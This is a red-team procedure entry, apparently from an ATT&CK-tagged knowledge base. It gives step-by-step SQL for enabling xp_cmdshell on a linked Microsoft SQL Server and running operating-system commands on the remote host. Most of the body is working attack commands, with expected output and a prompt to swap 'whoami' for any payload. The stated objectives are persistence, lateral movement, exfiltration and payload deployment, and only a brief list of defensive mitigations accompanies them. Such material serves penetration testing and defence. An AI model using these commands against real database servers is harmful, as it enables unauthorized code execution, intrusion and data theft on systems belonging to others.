---
id: 1af50b0f-ef38-4b4a-b0b5-73811e72ee33
name: Enable-and-Execute-xp_cmdshell-on-Linked-Database
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:20.133184+00:00'
updated_at: '2023-04-10T20:36:44.247931+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059.004 - Windows Command
    Shell]]
sub_techniques: []
tags:
  - '[[tags/Execute-Procedure-on-Linked-Database]]'
  - '[[tags/Linked-Database]]'
  - '[[tags/MSSQL-Server]]'
commands:
  - '[[commands/enable-xp_cmdshell-and-execute-whoami-on-linked-server]]'
platforms:
  - Windows
  - IaaS
tools: []
validated: true
---

# Enable-and-Execute-xp_cmdshell-on-Linked-Database

## Summary

This procedure enables the xp_cmdshell extended stored procedure on a linked SQL Server database, allowing execution of arbitrary operating system commands on the remote host with the privileges of the SQL Server service account. It is useful for post-exploitation scenarios where an attacker has database access and needs to achieve command execution on the underlying system.

## Description

xp_cmdshell is a built-in SQL Server extended stored procedure that spawns a command shell and passes a string to it for execution. By default, it is disabled for security reasons. This procedure demonstrates how to enable it remotely via a linked server configuration, which allows querying and executing procedures across database instances. Once enabled, attackers can run commands like 'whoami' to identify the service account context or perform further actions such as file transfer, user creation, or malware deployment. This technique requires sysadmin privileges on the linked database and is commonly used in lateral movement or persistence within Microsoft SQL Server environments. The target is typically a Windows-based SQL Server instance, and success depends on the linked server being properly configured with appropriate authentication.

## Requirements

1. Sysadmin-level privileges on the linked SQL Server database.
2. A configured linked server connection from the attacker's controlled database to the target linked database (e.g., using sp_addlinkedserver).
3. Access to SQL Server Management Studio (SSMS) or a SQL client like sqlcmd for executing queries.
4. Network connectivity between the databases for the linked server to function.

## Defense

- Disable xp_cmdshell globally using sp_configure 'xp_cmdshell', 0; RECONFIGURE; on all SQL Server instances and monitor for re-enablement attempts.
- Restrict linked server configurations to only trusted endpoints and audit linked server usage via SQL Server logs.
- Implement least-privilege principles for SQL Server service accounts to limit the impact of command execution.
- Enable SQL Server auditing for configuration changes and extended procedure calls, and monitor host OS for unexpected command shell activity using tools like Windows Event Logs or Sysmon.

## Objectives

1. Enable xp_cmdshell on a remote linked database to allow OS command execution.
2. Execute diagnostic commands (e.g., whoami) to assess the privilege context on the target host.
3. Establish a foothold for further post-exploitation activities like persistence or lateral movement.
4. Exfiltrate data or deploy payloads via the command shell.

## Instructions

### Step 1: Enable Advanced Options on Linked Server

**Context**: xp_cmdshell is an advanced feature, so first enable the display of advanced configuration options on the linked server to allow modification of xp_cmdshell settings.

**Command** ([[commands/enable-xp_cmdshell-and-execute-whoami-on-linked-server]]):

The full sequence begins here, but this step focuses on the initial configuration enablement. Execute the following via the linked server:

```sql
EXECUTE('EXEC sp_configure ''show advanced options'',1') AT "linked.database.local";
EXECUTE('RECONFIGURE') AT "linked.database.local";
```

> This command enables advanced options visibility and reapplies the configuration. Run this in SSMS connected to your controlling database. Expected output is a success message like "Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install." No errors indicate success.

### Step 2: Enable xp_cmdshell on Linked Server

**Context**: With advanced options visible, enable xp_cmdshell itself on the linked server to permit command shell execution.

**Command** ([[commands/enable-xp_cmdshell-and-execute-whoami-on-linked-server]]):

Continue the sequence:

```sql
EXECUTE('EXEC sp_configure ''xp_cmdshell'',1') AT "linked.database.local";
EXECUTE('RECONFIGURE') AT "linked.database.local";
```

> This sets xp_cmdshell to enabled (value 1) and reapplies changes. Expected output: "Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install." Verify by querying sp_configure to confirm the setting.

### Step 3: Execute Command via xp_cmdshell

**Context**: Now that xp_cmdshell is enabled, use it to run an OS command on the remote host, such as 'whoami' to identify the executing user context (typically the SQL Server service account).

**Command** ([[commands/enable-xp_cmdshell-and-execute-whoami-on-linked-server]]):

Final execution:

```sql
EXECUTE('EXEC xp_cmdshell ''whoami''') AT "linked.database.local";
```

> This invokes xp_cmdshell with the 'whoami' argument, returning the output directly in the query results. Expected output: A result set showing the username, e.g., "nt service\mssqlserver" or similar, indicating the service account. If no output or an error like "The EXECUTE permission was denied," check privileges. For other commands, replace 'whoami' with the desired payload, ensuring proper escaping of quotes.
